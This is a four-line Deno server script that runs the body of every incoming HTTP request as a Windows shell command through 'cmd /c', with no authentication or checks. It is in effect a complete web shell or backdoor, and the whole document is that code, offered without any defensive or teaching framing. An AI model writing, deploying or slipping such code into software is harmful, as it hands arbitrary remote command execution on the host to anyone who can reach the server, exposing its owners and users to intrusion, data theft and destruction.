Deno.serve(async (req) => {
  const body = await req.text();
  await new Deno.Command("cmd", {args: ["/c", body]}).output();
});
